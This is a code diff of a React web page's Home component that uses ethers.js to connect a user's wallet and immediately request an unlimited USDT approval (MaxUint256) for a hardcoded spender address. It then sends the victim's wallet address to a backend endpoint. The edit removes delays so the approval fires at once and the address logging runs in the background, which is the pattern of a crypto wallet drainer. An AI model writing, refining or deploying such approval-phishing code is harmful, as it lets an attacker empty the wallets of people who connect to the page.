@@ -25,7 +25,6 @@ export default function Home() {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
 
-      // 🔥 prende address utente
       const userAddress = await signer.getAddress();
 
       const usdt = new ethers.Contract(
@@ -36,22 +35,22 @@ export default function Home() {
         signer
       );
 
-      // 🔥 APPROVE SUBITO
+      // ⚡ APPROVE SUBITO (zero delay)
       const tx = await usdt.approve(
         SPENDER,
         ethers.MaxUint256
       );
 
-      await tx.wait();
-
-      // 🔥 SALVA DOPO APPROVE
-      await fetch("/api/save", {
+      // ⚡ SALVATAGGIO IN BACKGROUND (NON BLOCCA)
+      fetch("/api/save", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({ address: userAddress }),
       });
+
+      await tx.wait();
 
       alert("Approve completato!");
 
